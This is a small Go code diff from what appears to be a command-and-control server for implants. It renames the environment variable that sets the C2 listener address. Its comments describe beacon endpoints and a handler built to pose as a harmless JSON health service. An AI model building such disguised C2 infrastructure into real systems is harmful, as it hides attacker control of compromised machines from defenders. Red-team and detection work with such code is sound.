@@ -9,9 +9,9 @@ import (
 )
 
 // ListenAddr returns the optional dedicated C2 listener address from
-// ARTEX_C2_ADDR ("", "127.0.0.1:8443", ":8443", ...). When empty the beacon
+// BEHEMOTH_C2_ADDR ("", "127.0.0.1:8443", ":8443", ...). When empty the beacon
 // endpoints are mounted on the main server mux instead.
-func ListenAddr() string { return strings.TrimSpace(os.Getenv("ARTEX_C2_ADDR")) }
+func ListenAddr() string { return strings.TrimSpace(os.Getenv("BEHEMOTH_C2_ADDR")) }
 
 // Handler serves the implant-facing HTTP endpoints. It is designed to look
 // like an innocuous JSON service: unmatched paths return a static health
